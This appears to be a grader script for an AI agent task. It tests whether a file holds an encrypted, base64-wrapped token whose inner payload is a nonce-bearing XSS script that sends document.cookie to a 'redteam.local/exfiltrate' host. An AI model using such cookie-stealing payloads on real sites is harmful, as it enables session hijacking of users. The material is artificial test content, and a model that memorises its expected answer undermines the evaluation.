#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py

import os
import urllib.parse
import hashlib
import base64
import json
import subprocess
import tempfile

def test_payload_file_exists():
    assert os.path.isfile("/home/user/payload.txt"), "The file /home/user/payload.txt does not exist."

def test_payload_format_and_crypto():
    with open("/home/user/payload.txt", "r") as f:
        content = f.read().strip()

    assert '\n' not in content, "The payload.txt file should not contain newlines."

    parsed = urllib.parse.parse_qs(content)
    assert 'token' in parsed, "The query string is missing the 'token' parameter."
    assert 'checksum' in parsed, "The query string is missing the 'checksum' parameter."

    token = parsed['token'][0]
    checksum = parsed['checksum'][0]

    # Verify MD5 checksum
    expected_md5 = hashlib.md5(token.encode('utf-8')).hexdigest()
    assert checksum == expected_md5, f"Checksum mismatch. Expected {expected_md5}, got {checksum}."

    # Decode base64 token
    try:
        raw_data = base64.b64decode(token)
    except Exception as e:
        assert False, f"Failed to base64 decode the token: {e}"

    assert len(raw_data) > 16, "Token is too short to contain an IV and ciphertext."

    iv = raw_data[:16]
    ciphertext = raw_data[16:]

    key_hex = "7a5c32b98e4f1a6d0781c24e9b3a5f8d"
    iv_hex = iv.hex()

    # Decrypt using OpenSSL via subprocess
    with tempfile.NamedTemporaryFile(delete=False) as c_file:
        c_file.write(ciphertext)
        c_file_name = c_file.name

    try:
        result = subprocess.run(
            [
                "openssl", "enc", "-d", "-aes-128-cbc",
                "-K", key_hex,
                "-iv", iv_hex,
                "-in", c_file_name
            ],
            capture_output=True,
            check=False
        )

        assert result.returncode == 0, f"AES decryption failed. OpenSSL error: {result.stderr.decode('utf-8', errors='ignore')}"
        decrypted_bytes = result.stdout
    finally:
        os.remove(c_file_name)

    # Parse JSON
    try:
        data = json.loads(decrypted_bytes.decode('utf-8'))
    except Exception as e:
        assert False, f"Failed to parse decrypted payload as JSON: {e}"

    assert data.get("action") == "redirect", "JSON 'action' field is not 'redirect'."
    assert "payload" in data, "JSON is missing the 'payload' field."

    # Verify inner payload
    try:
        decoded_script = base64.b64decode(data["payload"]).decode('utf-8')
    except Exception as e:
        assert False, f"Failed to base64 decode the inner payload: {e}"

    expected_script = '<script nonce="Z1xP9qA4vN8mB2wE">window.location=\'https://redteam.local/exfiltrate?cookie=\'+document.cookie;</script>'
    assert decoded_script == expected_script, f"The decoded script does not match the expected payload. Got: {decoded_script}"
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
